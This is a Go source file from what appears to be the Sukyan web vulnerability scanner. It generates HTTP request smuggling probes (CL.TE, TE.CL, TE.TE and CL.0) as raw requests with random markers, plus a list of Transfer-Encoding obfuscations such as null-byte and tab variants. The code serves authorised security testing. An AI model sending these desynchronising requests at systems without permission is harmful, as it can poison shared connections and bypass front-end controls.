package payloads

import (
	"fmt"
	"regexp"
	"strings"

	"github.com/pyneda/sukyan/lib"
)

type SmugglingType int

const (
	SmugglingTypeCLTE SmugglingType = iota
	SmugglingTypeTECL
	SmugglingTypeTETE
	SmugglingTypeCL0
)

func (t SmugglingType) String() string {
	names := []string{"CL.TE", "TE.CL", "TE.TE", "CL.0"}
	if int(t) < len(names) {
		return names[t]
	}
	return "Unknown"
}

// SmugglingPayload represents a request smuggling test payload
type SmugglingPayload struct {
	BasePayload
	Name          string
	Type          SmugglingType
	RawRequest    []byte
	Description   string
	TEObfuscation string
	// Markers for response-based detection
	MethodMarker string // Random invalid method (e.g., "XKQM")
	PathMarker   string // Random path segment (e.g., "vj3k8mzp")
	Marker       string // Legacy marker field for CL.0 compatibility
}

func (p SmugglingPayload) GetValue() string {
	return string(p.RawRequest)
}

func (p SmugglingPayload) MatchAgainstString(text string) (bool, error) {
	// Check for any of our markers in the text
	if p.MethodMarker != "" && strings.Contains(text, p.MethodMarker) {
		return true, nil
	}
	if p.PathMarker != "" && strings.Contains(text, p.PathMarker) {
		return true, nil
	}
	if p.Marker != "" {
		return regexp.MatchString(regexp.QuoteMeta(p.Marker), text)
	}
	return false, nil
}

func (p SmugglingPayload) GetRawRequest() []byte {
	return p.RawRequest
}

// GenerateMethodMarker creates a random 4-character uppercase method name
func GenerateMethodMarker() string {
	return lib.GenerateRandomUppercaseString(4)
}

// GeneratePathMarker creates a random 8-character lowercase path segment
func GeneratePathMarker() string {
	return lib.GenerateRandomLowercaseString(8)
}

// TEObfuscation defines a Transfer-Encoding header obfuscation technique
type TEObfuscation struct {
	Name  string
	Value string
}

// TEObfuscations contains all Transfer-Encoding obfuscation variants for TE.TE testing
var TEObfuscations = []TEObfuscation{
	{"chunked", "chunked"},
	{"space-before", " chunked"},
	{"space-after", "chunked "},
	{"tab-before", "\tchunked"},
	{"tab-after", "chunked\t"},
	{"null-byte", "chunked\x00"},
	{"mixed-case", "Chunked"},
}

// EffectiveTEObfuscations contains the most effective obfuscation variants for smart mode
var EffectiveTEObfuscations = []TEObfuscation{
	{"space-before", " chunked"},
	{"tab-before", "\tchunked"},
	{"null-byte", "chunked\x00"},
	{"mixed-case", "Chunked"},
}

// GetCLTEPayload generates a CL.TE smuggling payload with unique markers
// This payload exploits frontends that use Content-Length while backends use Transfer-Encoding
func GetCLTEPayload(host, path string) SmugglingPayload {
	if path == "" {
		path = "/"
	}

	methodMarker := GenerateMethodMarker()
	pathMarker := GeneratePathMarker()

	// Smuggled request that will be left in the buffer
	// Format: {METHOD} /{PATH} HTTP/1.1\r\nFoo:
	// The trailing "Foo:" captures the start of the follow-up request
	smuggled := fmt.Sprintf("%s /%s HTTP/1.1\r\nFoo: ", methodMarker, pathMarker)

	// Body structure for CL.TE:
	// 0\r\n\r\n{smuggled request}
	// Frontend sees Content-Length bytes and forwards everything
	// Backend sees chunked terminator (0\r\n\r\n) and leaves smuggled request in buffer
	body := fmt.Sprintf("0\r\n\r\n%s", smuggled)

	raw := fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Type: application/x-www-form-urlencoded\r\n"+
			"Content-Length: %d\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s",
		path, host, len(body), body)

	return SmugglingPayload{
		Name:         "CL.TE Response-Based Detection",
		Type:         SmugglingTypeCLTE,
		RawRequest:   []byte(raw),
		MethodMarker: methodMarker,
		PathMarker:   pathMarker,
		Description:  "Frontend uses Content-Length, backend uses Transfer-Encoding. Smuggled request with invalid method is left in buffer.",
	}
}

// GetTECLPayload generates a TE.CL smuggling payload with unique markers
// This payload exploits frontends that use Transfer-Encoding while backends use Content-Length
func GetTECLPayload(host, path string) SmugglingPayload {
	if path == "" {
		path = "/"
	}

	methodMarker := GenerateMethodMarker()
	pathMarker := GeneratePathMarker()

	// Build the smuggled request that will be left in the buffer
	smuggledRequest := fmt.Sprintf(
		"%s /%s HTTP/1.1\r\n"+
			"Content-Type: application/x-www-form-urlencoded\r\n"+
			"Content-Length: 15\r\n"+
			"\r\n"+
			"x=1",
		methodMarker, pathMarker)

	// Calculate chunk size in hex
	chunkSizeHex := fmt.Sprintf("%x", len(smuggledRequest))

	// Build the chunked body
	// Frontend sees complete chunked request
	// Backend sees only Content-Length bytes, leaving smuggled request in buffer
	chunkedBody := fmt.Sprintf("%s\r\n%s\r\n0\r\n\r\n", chunkSizeHex, smuggledRequest)

	// Content-Length is set to just cover the chunk size line
	// This causes backend to only read "{chunkSizeHex}\r\n" and leave the rest
	contentLength := len(chunkSizeHex) + 2 // +2 for \r\n

	raw := fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Type: application/x-www-form-urlencoded\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"Content-Length: %d\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s",
		path, host, contentLength, chunkedBody)

	return SmugglingPayload{
		Name:         "TE.CL Response-Based Detection",
		Type:         SmugglingTypeTECL,
		RawRequest:   []byte(raw),
		MethodMarker: methodMarker,
		PathMarker:   pathMarker,
		Description:  "Frontend uses Transfer-Encoding, backend uses Content-Length. Smuggled request with invalid method is left in buffer.",
	}
}

// GetTETEPayload generates a TE.TE smuggling payload with obfuscated Transfer-Encoding header
// This exploits differences in how frontend and backend parse obfuscated TE headers
func GetTETEPayload(host, path string, obfuscation TEObfuscation) SmugglingPayload {
	if path == "" {
		path = "/"
	}

	methodMarker := GenerateMethodMarker()
	pathMarker := GeneratePathMarker()

	// Same structure as CL.TE but with obfuscated Transfer-Encoding
	smuggled := fmt.Sprintf("%s /%s HTTP/1.1\r\nFoo: ", methodMarker, pathMarker)
	body := fmt.Sprintf("0\r\n\r\n%s", smuggled)

	raw := fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Type: application/x-www-form-urlencoded\r\n"+
			"Content-Length: %d\r\n"+
			"Transfer-Encoding:%s\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s",
		path, host, len(body), obfuscation.Value, body)

	return SmugglingPayload{
		Name:          fmt.Sprintf("TE.TE Response-Based Detection (%s)", obfuscation.Name),
		Type:          SmugglingTypeTETE,
		RawRequest:    []byte(raw),
		MethodMarker:  methodMarker,
		PathMarker:    pathMarker,
		TEObfuscation: obfuscation.Name,
		Description:   fmt.Sprintf("TE.TE with obfuscated Transfer-Encoding: %q. Frontend and backend disagree on which TE header to use.", obfuscation.Value),
	}
}

// GetTETEPayloads returns TE.TE payloads for all effective obfuscation variants
func GetTETEPayloads(host, path string) []SmugglingPayload {
	var payloads []SmugglingPayload
	for _, obf := range EffectiveTEObfuscations {
		payloads = append(payloads, GetTETEPayload(host, path, obf))
	}
	return payloads
}

// GetAllTETEPayloads returns TE.TE payloads for all obfuscation variants (for fuzz mode)
func GetAllTETEPayloads(host, path string) []SmugglingPayload {
	var payloads []SmugglingPayload
	for _, obf := range TEObfuscations {
		// Skip plain chunked as it's identical to CL.TE
		if obf.Name == "chunked" {
			continue
		}
		payloads = append(payloads, GetTETEPayload(host, path, obf))
	}
	return payloads
}

// GetCL0Payload generates a CL.0 smuggling payload
// This exploits backends that ignore Content-Length entirely
func GetCL0Payload(host, path string) SmugglingPayload {
	if path == "" {
		path = "/"
	}

	pathMarker := GeneratePathMarker()
	smuggled := fmt.Sprintf("GET /%s HTTP/1.1\r\nX: ", pathMarker)

	raw := fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Type: application/x-www-form-urlencoded\r\n"+
			"Connection: keep-alive\r\n"+
			"Content-Length: %d\r\n"+
			"\r\n"+
			"%s",
		path, host, len(smuggled), smuggled)

	return SmugglingPayload{
		Name:        "CL.0 Response-Based Detection",
		Type:        SmugglingTypeCL0,
		RawRequest:  []byte(raw),
		PathMarker:  pathMarker,
		Marker:      pathMarker, // For backward compatibility
		Description: "Backend ignores Content-Length, body becomes next request.",
	}
}

// BuildFollowUpRequest creates a standard follow-up request for pipelined smuggling detection
func BuildFollowUpRequest(host, path string) []byte {
	if path == "" {
		path = "/"
	}
	return []byte(fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Type: application/x-www-form-urlencoded\r\n"+
			"Content-Length: 3\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"x=1",
		path, host))
}
